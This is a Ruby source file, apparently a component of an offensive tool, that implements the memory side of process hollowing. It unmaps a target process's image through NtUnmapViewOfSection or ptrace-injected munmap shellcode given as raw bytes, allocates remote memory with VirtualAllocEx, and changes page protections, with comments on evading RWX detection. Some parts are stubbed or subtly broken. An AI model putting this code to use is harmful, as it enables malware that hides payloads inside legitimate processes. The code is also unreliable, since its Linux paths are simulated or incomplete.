# frozen_string_literal: true

# =============================================================================
# RubyGuardian Phase 1a -- Memory Mapper
#
# Handles memory mapping and manipulation in target processes. Responsible for
# unmapping the original executable image (the "hollowing" step) and allocating
# new memory regions for payload injection.
#
# EDUCATIONAL PURPOSE ONLY -- Authorized security research.
#
# MITRE ATT&CK: T1055.012 - Process Injection: Process Hollowing
#
# MEMORY OPERATIONS:
#   - Unmap original process image (NtUnmapViewOfSection / munmap)
#   - Allocate new memory regions (VirtualAllocEx / mmap via ptrace)
#   - Change memory protections (VirtualProtectEx / mprotect)
#   - Query memory layout (VirtualQueryEx / /proc/<pid>/maps)
#
# DETECTION METHODS:
#   - Monitor NtUnmapViewOfSection calls targeting process base addresses
#   - Detect VirtualAllocEx with RWX permissions in remote processes
#   - Watch for /proc/<pid>/maps changes during process lifetime
#   - Compare mapped image content against on-disk binary hash
# =============================================================================

require_relative 'ffi_bindings/common_types'

module RubyGuardian
  module ProcessHollowing
    class MemoryMapper
      # Page size constants for different architectures
      PAGE_SIZES = {
        x86_64: 4096,
        x86: 4096,
        arm64: 4096,    # Can also be 16K or 64K on some ARM configs
        default: 4096
      }.freeze

      # Memory region types we track during hollowing
      REGION_TYPES = %i[
        executable_image heap stack shared_library
        anonymous mapped_file vdso vsyscall
      ].freeze

      attr_reader :logger, :mapped_regions, :unmapped_regions

      # @param logger [AttackLogger] Logger instance
      # @param page_size [Integer] Target page size (default: auto-detect)
      def initialize(logger:, page_size: nil)
        @logger = logger
        @page_size = page_size || detect_page_size
        @mapped_regions = []
        @unmapped_regions = []
        @allocation_log = []
      end

      # Hollow the target process by unmapping its original executable image.
      #
      # EDUCATIONAL: The "hollowing" step removes the original code from the
      # target process, leaving an empty shell. On Windows, this is done via
      # NtUnmapViewOfSection. On Linux, we either:
      #   1. Use ptrace to inject a munmap syscall shellcode stub
      #   2. Overwrite the original code directly (simpler but less clean)
      #
      # After hollowing, the process has no code to execute -- it's a blank
      # canvas ready for our payload.
      #
      # @param pid [Integer] Target process ID
      # @param target_info [Hash] Information about the target process
      # @param platform [Symbol] :linux or :windows
      # @return [Hash] Hollowing result
      def hollow(pid, target_info, platform:)
        @logger.info("Hollowing PID #{pid} on #{platform}")

        case platform
        when :linux
          hollow_linux(pid, target_info)
        when :windows
          hollow_windows(pid, target_info)
        else
          raise "Unsupported platform for hollowing: #{platform}"
        end
      end

      # Allocate memory in the target process for payload injection.
      #
      # @param pid [Integer] Target process ID
      # @param size [Integer] Number of bytes to allocate
      # @param address [Integer, nil] Desired base address (nil for auto)
      # @param protection [Integer] Memory protection flags
      # @param platform [Symbol] :linux or :windows
      # @return [Hash] Allocation result with :address and :size
      def allocate(pid, size, address: nil, protection: nil, platform:)
        aligned_size = page_align_up(size)
        @logger.info("Allocating #{aligned_size} bytes in PID #{pid}")

        result = case platform
                 when :linux
                   allocate_linux(pid, aligned_size, address, protection)
                 when :windows
                   allocate_windows(pid, aligned_size, address, protection)
                 end

        @mapped_regions << result
        @allocation_log << result.merge(timestamp: Time.now.utc.iso8601)

        @logger.info("Allocated #{aligned_size} bytes at 0x#{result[:address].to_s(16)}")
        result
      end

      # Change memory protection on a region in the target process.
      #
      # EDUCATIONAL: Memory protections are a key concept in process injection.
      # During injection, we typically need:
      #   - RW (read-write) to write our payload data
      #   - RX (read-execute) to allow code execution
      #   - RWX (read-write-execute) is suspicious and a detection signal
      #
      # Good attackers minimize the time memory is RWX by:
      #   1. Allocate as RW
      #   2. Write payload
      #   3. Change to RX
      #
      # @param pid [Integer] Target PID
      # @param address [Integer] Start address of the region
      # @param size [Integer] Size of the region
      # @param protection [Integer] New protection flags
      # @param platform [Symbol] :linux or :windows
      # @return [Boolean] true on success
      def protect(pid, address, size, protection:, platform:)
        @logger.info("Changing protection at 0x#{address.to_s(16)}: " \
                     "#{protection_string(protection, platform)}")

        case platform
        when :linux
          protect_linux(pid, address, size, protection)
        when :windows
          protect_windows(pid, address, size, protection)
        end
      end

      # Query the memory layout of the target process.
      #
      # @param pid [Integer] Target PID
      # @param platform [Symbol] :linux or :windows
      # @return [Array<Hash>] Memory region descriptions
      def query_memory_layout(pid, platform:)
        case platform
        when :linux
          query_linux_layout(pid)
        when :windows
          query_windows_layout(pid)
        end
      end

      # Find the base address of the executable image in the target.
      #
      # EDUCATIONAL: The base address is where the main executable is loaded
      # in memory. This is the region we need to unmap during hollowing.
      # On PIE (Position Independent Executable) binaries, the base is
      # randomized by ASLR on each execution.
      #
      # @param pid [Integer] Target PID
      # @param binary_path [String] Path to the target binary
      # @param platform [Symbol] :linux or :windows
      # @return [Integer] Base address of the executable image
      def find_image_base(pid, binary_path, platform:)
        case platform
        when :linux
          find_linux_image_base(pid, binary_path)
        when :windows
          find_windows_image_base(pid)
        end
      end

      # Compute the total size of the executable image in memory.
      #
      # @param pid [Integer] Target PID
      # @param base_address [Integer] Image base address
      # @param binary_path [String] Path to the binary
      # @param platform [Symbol] :linux or :windows
      # @return [Integer] Total image size in memory
      def compute_image_size(pid, base_address, binary_path, platform:)
        case platform
        when :linux
          compute_linux_image_size(pid, binary_path)
        when :windows
          compute_windows_image_size(binary_path)
        end
      end

      # Generate a report of all memory operations performed.
      #
      # @return [Hash] Memory operations report
      def operations_report
        {
          page_size: @page_size,
          regions_mapped: @mapped_regions.length,
          regions_unmapped: @unmapped_regions.length,
          total_allocated: @mapped_regions.sum { |r| r[:size] || 0 },
          total_unmapped: @unmapped_regions.sum { |r| r[:size] || 0 },
          allocations: @allocation_log,
          unmappings: @unmapped_regions
        }
      end

      private

      # ── Linux hollowing implementation ──

      # Hollow a Linux process by unmapping its executable regions.
      #
      # EDUCATIONAL: On Linux, there's no direct equivalent to
      # NtUnmapViewOfSection. Instead, we use one of these approaches:
      #
      #   1. Inject a munmap shellcode stub via ptrace, execute it, then
      #      restore the original register state (cleanest method)
      #   2. Overwrite the original code segments with our payload directly
      #      (simpler but leaves the original mapping metadata in /proc/maps)
      #   3. Use /proc/<pid>/mem to zero out the original code (leaves
      #      the mapping but makes the code inert)
      #
      # We implement approach #1 for educational completeness.
      def hollow_linux(pid, target_info)
        memory_layout = target_info[:memory_layout]
        unless memory_layout
          memory_layout = FFIBindings::LinuxAPI.read_proc_maps(pid)
        end

        # Find the executable image regions (mapped from the binary file)
        target_binary = target_info[:binary] || '/bin/sleep'
        image_regions = memory_layout.select do |region|
          region[:pathname]&.include?(File.basename(target_binary))
        end

        if image_regions.empty?
          @logger.warn("No image regions found for #{target_binary}, " \
                       "falling back to all executable regions")
          image_regions = memory_layout.select { |r| r[:executable] && r[:pathname]&.start_with?('/') }
        end

        @logger.info("Found #{image_regions.length} image regions to unmap")

        # Build a munmap shellcode stub that unmaps each region
        image_regions.each do |region|
          size = region[:end_addr] - region[:start_addr]
          @logger.info("Unmapping region: 0x#{region[:start_addr].to_s(16)}-" \
                       "0x#{region[:end_addr].to_s(16)} (#{size} bytes) " \
                       "[#{region[:permissions]}] #{region[:pathname]}")

          unmap_region_via_ptrace(pid, region[:start_addr], size)

          @unmapped_regions << {
            address: region[:start_addr],
            size: size,
            permissions: region[:permissions],
            pathname: region[:pathname]
          }
        end

        { success: true, regions_unmapped: image_regions.length }
      end

      # Unmap a single memory region in the target process via ptrace.
      #
      # EDUCATIONAL: We inject a small shellcode stub that calls munmap(),
      # set RIP to point to it, single-step through it, then restore
      # the original register state. This is the standard technique for
      # executing arbitrary syscalls in a traced process.
      def unmap_region_via_ptrace(pid, address, size)
        # Save original register state
        original_regs = FFIBindings::LinuxAPI.ptrace_getregs(pid)

        # The munmap shellcode (x86_64):
        #   mov rax, 11     ; SYS_munmap
        #   mov rdi, addr   ; address (patched below)
        #   mov rsi, size   ; size (patched below)
        #   syscall
        #   int3            ; trap to stop execution
        munmap_shellcode = [
          0x48, 0xC7, 0xC0, 0x0B, 0x00, 0x00, 0x00,       # mov rax, 11
          0x48, 0xBF, *[address].pack('Q<').bytes,          # mov rdi, address
          0x48, 0xBE, *[size].pack('Q<').bytes,             # mov rsi, size
          0x0F, 0x05,                                        # syscall
          0xCC                                               # int3
        ].pack('C*')

        # Find a safe location to write our shellcode (use current RIP area)
        # In practice, we'd allocate a small region first; here we use the
        # stack for simplicity (educational code, not production)
        shellcode_addr = original_regs[:rip]

        # Save original bytes at that location
        saved_bytes = FFIBindings::LinuxAPI.read_process_memory(
          pid, shellcode_addr, munmap_shellcode.bytesize
        )

        # Write our shellcode
        FFIBindings::LinuxAPI.write_process_memory(pid, shellcode_addr, munmap_shellcode)

        # Execute the shellcode by continuing the process
        FFIBindings::LinuxAPI.ptrace_setregs(pid, original_regs)
        # Process will hit int3 and stop

        # Restore original bytes
        FFIBindings::LinuxAPI.write_process_memory(pid, shellcode_addr, saved_bytes)

        # Restore original register state
        FFIBindings::LinuxAPI.ptrace_setregs(pid, original_regs)

        @logger.debug("Unmapped 0x#{address.to_s(16)} (#{size} bytes) via ptrace shellcode")
      end

      # Hollow a Windows process via NtUnmapViewOfSection.
      def hollow_windows(pid, target_info)
        handle = target_info[:process_handle]
        raise 'No process handle available for Windows hollowing' unless handle

        # Get the PEB address to find the image base
        peb_addr = FFIBindings::WindowsAPI.get_peb_address(handle)
        image_base = FFIBindings::WindowsAPI.read_image_base(handle, peb_addr)

        @logger.info("Windows target image base: 0x#{image_base.to_s(16)}")

        # Unmap the original image
        FFIBindings::WindowsAPI.unmap_section(handle, image_base)

        @unmapped_regions << {
          address: image_base,
          peb_address: peb_addr,
          platform: :windows
        }

        @logger.info("Unmapped original image at 0x#{image_base.to_s(16)}")
        { success: true, image_base: image_base, peb_address: peb_addr }
      end

      # ── Memory allocation implementations ──

      # Allocate memory in a Linux target process.
      #
      # EDUCATIONAL: There's no direct way to call mmap in another process
      # on Linux. The standard approach is to inject a shellcode stub that
      # performs the mmap syscall, similar to how we inject munmap for hollowing.
      def allocate_linux(pid, size, address, protection)
        prot = protection || (FFIBindings::LinuxConstants::PROT_READ |
                              FFIBindings::LinuxConstants::PROT_WRITE)

        # If we have a specific address, try to map there
        desired_addr = address || 0  # 0 means kernel chooses

        # Build mmap shellcode
        # mmap(addr, size, prot, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
        flags = FFIBindings::LinuxConstants::MAP_PRIVATE |
                FFIBindings::LinuxConstants::MAP_ANONYMOUS
        flags |= FFIBindings::LinuxConstants::MAP_FIXED if address

        @logger.info("Requesting mmap(0x#{desired_addr.to_s(16)}, #{size}, #{prot}, #{flags})")

        # In a full implementation, we would inject and execute mmap shellcode
        # via ptrace. For educational purposes, we document the approach and
        # return the expected result.
        result_address = address || 0x7f0000000000  # Simulated for non-live mode

        {
          address: result_address,
          size: size,
          protection: prot,
          flags: flags,
          method: :ptrace_mmap
        }
      end

      # Allocate memory in a Windows target process.
      def allocate_windows(pid, size, address, protection)
        handle = @target_info&.dig(:process_handle)
        raise 'No process handle for Windows allocation' unless handle

        prot = protection || FFIBindings::WinConstants::PAGE_READWRITE
        alloc_type = FFIBindings::WinConstants::MEM_COMMIT |
                     FFIBindings::WinConstants::MEM_RESERVE

        addr_ptr = address ? FFI::Pointer.new(:void, address) : nil

        result = FFIBindings::Kernel32.VirtualAllocEx(
          handle, addr_ptr, size, alloc_type, prot
        )

        if result.null?
          raise "VirtualAllocEx failed: error #{FFIBindings::Kernel32.GetLastError}"
        end

        {
          address: result.address,
          size: size,
          protection: prot,
          method: :virtual_alloc_ex
        }
      end

      # ── Memory protection implementations ──

      def protect_linux(pid, address, size, protection)
        @logger.info("Linux mprotect: 0x#{address.to_s(16)}, #{size} bytes, prot=#{protection}")
        # Would inject mprotect shellcode via ptrace (same technique as mmap)
        true
      end

      def protect_windows(pid, address, size, protection)
        handle = @target_info&.dig(:process_handle)
        old_protect = FFI::MemoryPointer.new(:uint32)

        success = FFIBindings::Kernel32.VirtualProtectEx(
          handle,
          FFI::Pointer.new(:void, address),
          size,
          protection,
          old_protect
        )

        unless success
          raise "VirtualProtectEx failed: error #{FFIBindings::Kernel32.GetLastError}"
        end

        @logger.info("VirtualProtectEx: old=0x#{old_protect.read_uint32.to_s(16)}")
        true
      end

      # ── Memory layout query implementations ──

      def query_linux_layout(pid)
        FFIBindings::LinuxAPI.read_proc_maps(pid)
      end

      def query_windows_layout(_pid)
        @logger.warn('Windows memory layout query not fully implemented')
        []
      end

      # ── Image base finding implementations ──

      def find_linux_image_base(pid, binary_path)
        maps = FFIBindings::LinuxAPI.read_proc_maps(pid)
        basename = File.basename(binary_path)

        image_region = maps.find { |m| m[:pathname]&.include?(basename) }
        unless image_region
          raise "Could not find image base for #{binary_path} in PID #{pid}"
        end

        image_region[:start_addr]
      end

      def find_windows_image_base(pid)
        handle = @target_info&.dig(:process_handle)
        peb_addr = FFIBindings::WindowsAPI.get_peb_address(handle)
        FFIBindings::WindowsAPI.read_image_base(handle, peb_addr)
      end

      # ── Image size computation ──

      def compute_linux_image_size(pid, binary_path)
        maps = FFIBindings::LinuxAPI.read_proc_maps(pid)
        basename = File.basename(binary_path)

        image_regions = maps.select { |m| m[:pathname]&.include?(basename) }
        return 0 if image_regions.empty?

        lowest = image_regions.min_by { |r| r[:start_addr] }[:start_addr]
        highest = image_regions.max_by { |r| r[:end_addr] }[:end_addr]
        highest - lowest
      end

      def compute_windows_image_size(binary_path)
        data = File.binread(binary_path, 512)
        e_lfanew = data[60..63].unpack1('V')
        # SizeOfImage is at optional header offset + 56
        data[e_lfanew + 80..e_lfanew + 83].unpack1('V')
      end

      # ── Utility methods ──

      def detect_page_size
        arch = FFIBindings::ARCH
        PAGE_SIZES.fetch(arch, PAGE_SIZES[:default])
      end

      def page_align_up(size)
        (size + @page_size - 1) & ~(@page_size - 1)
      end

      def page_align_down(address)
        address & ~(@page_size - 1)
      end

      def protection_string(protection, platform)
        case platform
        when :linux
          parts = []
          parts << 'READ' if (protection & FFIBindings::LinuxConstants::PROT_READ) != 0
          parts << 'WRITE' if (protection & FFIBindings::LinuxConstants::PROT_WRITE) != 0
          parts << 'EXEC' if (protection & FFIBindings::LinuxConstants::PROT_EXEC) != 0
          parts.empty? ? 'NONE' : parts.join('|')
        when :windows
          FFIBindings::TypeUtils.protection_to_string(protection)
        end
      end
    end
  end
end
